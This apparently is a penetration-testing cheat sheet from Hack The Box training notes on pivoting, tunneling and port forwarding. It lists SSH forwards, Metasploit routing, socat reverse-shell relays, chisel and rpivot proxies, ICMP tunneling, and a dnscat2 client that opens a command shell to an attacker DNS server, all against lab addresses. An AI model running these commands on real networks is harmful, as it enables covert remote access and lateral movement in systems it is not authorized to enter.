---
layout: post
title:  Pivoting, Tunneling, and Port Forwarding
description: 
date:   2018-04-21 15:01:35 +0300
image:  'https://academy.hackthebox.com/storage/modules/158/logo.png'
cheats: true
featured: true
toc: true
tags:   [cheatsheet, cpts, oscp, osce]
---

## Dynamic Port Forwarding SSH and SOCKS Tunneling

![image](https://github.com/0x4rs3nic/Cheatsheets/assets/150775096/1b6c00ee-569f-4721-b746-903f66743426)
{% highlight bash %}
# Local port forward
ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64

# Multiple local port forward
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64

# Confirm port forward
netstat -antp | grep 1234
{% endhighlight %}

![image](https://github.com/0x4rs3nic/Cheatsheets/assets/150775096/b0cbbc78-327c-415f-a882-c5023a93efa0)
{% highlight bash %}
# Dynamic port forwarding
ssh -D 9050 ubuntu@10.129.202.64

# Route traffic through porxychains
proxychains nmap -v -sn 172.16.5.1-200
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
{% endhighlight %}

## Remote/Reverse Port Forwarding with SSH

![image](https://github.com/0x4rs3nic/Cheatsheets/assets/150775096/3dc9c1bd-5311-439f-a82f-e6209304d095)


{% highlight bash %}
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
{% endhighlight %}



##Meterpreter Tunneling & Port Forwarding

{% highlight bash %}
# Ping sweep with various methods
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23 # MSF
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done # Linux
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply" # cmd
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"} # Powershell

# Set up SOCKS proxy with MSF
use auxiliary/server/socks_proxy
socks4 	127.0.0.1 9050 # Add line to conf file
# START THE PROXY AND SET TO 4a

# Use autoroute for pivoting 
use post/multi/manage/autoroute
run autoroute -s 172.16.5.0/23 # Add route
run autoroute -p # List active routes

# Create local forward from MSF
portfwd add -l 3300 -p 3389 -r 172.16.5.19
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18 # Reverse
{% endhighlight %}

## Using Socat

{% highlight bash %}
# Redirect reverse shell to attack host (forwards packets to attack host)
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Redirect bind shell to attack host (forward packets to Windows Host)
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
{% endhighlight %}

![](https://images.spr.so/cdn-cgi/imagedelivery/j42No7y-dcokJuNgXeA0ig/d69cc998-d7f5-465e-82fe-61fba8605685/Untitled/w=1920,quality=80)

## Pivoting around a Network

{% highlight bash %}
# With Plink
plink -D 9050 ubuntu@10.129.15.50

# With SSHuttle
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v

# With rpivot
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999 # From targets
{% endhighlight %}

![](https://images.spr.so/cdn-cgi/imagedelivery/j42No7y-dcokJuNgXeA0ig/365b73d6-4df5-4651-9713-3cf1877cb4ad/Untitled/w=1920,quality=80)

{% highlight bash %}
# Using netsh.exe
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
netsh.exe interface portproxy show v4tov4

# Then connect to the machine through the pivot
xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
{% endhighlight %}

![](https://images.spr.so/cdn-cgi/imagedelivery/j42No7y-dcokJuNgXeA0ig/365b73d6-4df5-4651-9713-3cf1877cb4ad/Untitled/w=1920,quality=80)

## DNS Tunneling

- https://github.com/iagox86/dnscat2
- https://github.com/lukebaggett/dnscat2-powershell

{% highlight bash %}
# Server side 
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

# Client side (with powershell)
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

# Enter session 
window -i [id]
{% endhighlight %}

## SOCKS5 Tunneling with Chisel

**Chisel Pivot**

{% highlight bash %}
# Chisel server on pivot host
./chisel server -v -p 1234 --socks5

# Connect to the pivot host
./chisel client -v 10.129.202.64:1234 socks

# Proxychains config file
tail -f /etc/proxychains.conf
{% endhighlight %}

**Chisel Reverse Pivot**

{% highlight bash %}
# Chisel server on attack host
sudo ./chisel server --reverse -v -p 1234 --socks5

# Chisel client on pivot host
./chisel client -v 10.10.14.17:1234 R:socks
{% endhighlight %}

## ICMP Tunneling

- https://github.com/utoni/ptunnel-ng

{% highlight bash %}
# ptunnel server on target host
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Connect from attack host
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# Tunnel SSH through ICMP
ssh -p2222 -lubuntu 127.0.0.1
{% endhighlight %}

## RDP and SOCKS Tunneling with SocksOverRDP

- https://github.com/nccgroup/SocksOverRDP/releases
- https://www.proxifier.com/download/#win-tab

{% highlight bash %}
# Load SocksOverRDP dll on pivot host
regsvr32.exe SocksOverRDP-Plugin.dll

# Connect to other host and start server
SocksOverRDP-Server.exe

# Configure SOCKS profile on port 1080 
# RDP to wanted host
{% endhighlight %}
